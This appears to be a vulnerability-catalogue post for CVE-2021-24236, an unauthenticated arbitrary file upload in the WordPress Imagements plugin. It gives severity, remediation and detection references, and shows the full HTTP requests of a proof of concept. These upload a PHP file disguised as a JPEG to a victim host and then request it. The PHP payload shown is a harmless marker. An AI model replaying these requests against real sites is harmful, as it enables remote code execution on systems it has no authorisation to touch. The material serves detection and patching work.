---
layout: post
cve_id: CVE-2021-24236
title: WordPress Imagements <=1.2.5 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24236.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24236.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pussycat0x
severity: critical
impact: 'This vulnerability can lead to remote code execution and compromise the affected
  WordPress site.

  '
remediation: 'Update WordPress Imagements plugin to version 1.2.6 or later to fix
  the arbitrary file upload vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/8f24e74f-60e3-4100-9ab2-ec31b9c9cdea
- https://wordpress.org/plugins/imagements/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24236
- https://nvd.nist.gov/vuln/detail/CVE-2021-24236
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-24236
  cwe-id: CWE-434
  epss-score: 0.7493
  epss-percentile: 0.98826
  cpe: cpe:2.3:a:imagements_project:imagements:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  vendor: imagements_project
  product: imagements
  framework: wordpress
tags:
- cve2021
- cve
- wp
- unauth
- imagements
- wpscan
- fileupload
- wordpress
- wp-plugin
- intrusive
- imagements_project
- vuln
---

## ðŸ” Vulnerability Description
WordPress Imagements plugin through 1.2.5 is susceptible to arbitrary file upload which can lead to remote code execution. The plugin allows images to be uploaded in comments but only checks for the Content-Type in the request to forbid dangerous files. An attacker can upload arbitrary files by using a valid image Content-Type along with a PHP filename and code.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-comments-post.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 1246
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Accept-Encoding: gzip

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment"

38BqH7AClmP2U96MoPhQrjpackF
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="author"

38BqH7AClmP2U96MoPhQrjpackF
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="email"

38BqH7AClmP2U96MoPhQrjpackF@email.com
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="url"

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="checkbox"


yes
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="naam"

38BqH7AClmP2U96MoPhQrjpackF
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="image"; filename="38bqh7aclmp2u96mophqrjpackf.php"
Content-Type: image/jpeg

<?php echo md5("CVE-2021-24236");unlink(__FILE__);?>

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="submit"

Post Comment
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_post_ID"

1
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_parent"

0
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--
```

```nohighlight
GET /wp-content/plugins/imagements/images/38bqh7aclmp2u96mophqrjpackf.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

